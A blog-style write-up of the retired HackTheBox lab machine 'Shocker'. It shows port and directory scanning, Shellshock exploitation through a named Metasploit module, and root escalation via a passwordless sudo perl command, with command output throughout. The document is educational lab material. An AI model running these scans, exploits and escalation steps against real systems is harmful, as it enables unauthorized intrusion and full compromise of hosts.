---
layout: post
title: "Writeup: HackTheBox Shocker - with Metasploit"
description: "Rooting Shocker using Metasploit."
tags: pentest hackthebox writeup
---

This series will follow my exercises in [HackTheBox][].
All published writeups are for retired HTB machines.
Whether or not I use Metasploit to pwn the server will be indicated in the title.
 
# Shocker

_<small>Difficulty: Easy</small>_

_<small>Machine IP: 10.10.10.56</small>_

A port scan identifies a web server on the target as well as SSH on a non-standard port.

```bash
sudo nmap -sS -T4 -p- 10.10.10.56

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 10:15 EDT
Nmap scan report for 10.10.10.56
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

```bash
sudo nmap -sS -T4 -A -p 80,2222 10.10.10.56
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-07 10:17 EDT
Nmap scan report for 10.10.10.56
Host is up (0.014s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), Linux 4.8 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
No exact OS matches for host (test conditions non-ideal).                                                        
Network Distance: 2 hops                                                                                         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                          
                                                                                                                 
TRACEROUTE (using port 80/tcp)                                                                                   
HOP RTT      ADDRESS                                                                                             
1   13.10 ms 10.10.14.1                                                                                          
2   13.45 ms 10.10.10.56
```

Given the name of this box is Shocker, I am assuming this will require [Shellshock][].
Shellshock requires an executable script to exist in the `/cgi-bin` directory of a web server.
Any script will suffice.

[gobuster][] identifies a `/cgi-bin` directory.

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 30 -u http://10.10.10.56/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/
[+] Threads:        30
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/07 10:22:08 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/cgi-bin/ (Status: 403)
/server-status (Status: 403)
===============================================================
2020/06/07 10:22:19 Finished                                                                                      
===============================================================
```

And [wfuzz][] uncovers a `user.sh` file under `/cgi-bin`.

```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.10.10.56/cgi-bin/FUZZ.sh

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.56/cgi-bin/FUZZ.sh
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000000864:   200        7 L      18 W     119 Ch      "user"                                           

Total time: 1.623817
Processed Requests: 949
Filtered Requests: 948
Requests/sec.: 584.4252
```

I am ready to exploit Shellshock.
Now that I know what script to use under `/cgi-bin`, I can run a Shellshock auxiliary check from Metasploit:

![msf shellshock check][]

The scanner indicates that the server is vulnerable.
I can exploit this with the `exploit/multi/http/apache_mod_cgi_bash_env_exec` module in Metasploit.

![msf shellshock exploit][]

I get a shell as the `shelly` user.
From here I can get the user flag.

It appears that `shelly` can execute `perl` with root permissions!
I should be able to simply call `/bin/bash` through perl and obtain a root shell.

```bash
shelly@Shocker:~$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Don't forget to obtain a TTY shell, though!
If you see this error, run the following steps:

```bash
shelly@Shocker:~$ sudo perl —e 'exec "/bin/sh";'
sudo e 'exec "/bin/sh";'perl 
sudo: no tty present and no askpass program specified
shelly@Shocker:~$
```

Run:

```bash
/bin/bash -i
export TERM=xterm-256color
SHELL=/bin/bash script -q /dev/null
# ctrl+z to background channel
# background meterpreter session
stty raw -echo
reset
reset
# go back to meterpreter session and channel
reset
```

You should now have a TTY shell.
Now, I can execute bash through perl and obtain a root shell.

```bash
shelly@Shocker:~$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
root@Shocker:~# cd /root
cd /root
root@Shocker:/root# whoami
whoami
root
```

[gobuster]: https://github.com/OJ/gobuster
[hackthebox]: https://www.hackthebox.eu
[shellshock]: https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/
[wfuzz]: https://tools.kali.org/web-applications/wfuzz

[msf shellshock check]: /assets/img/htb/shocker/shellshock-auxiliary-check.png
[msf shellshock exploit]: /assets/img/htb/shocker/shellshock-meterpreter.png
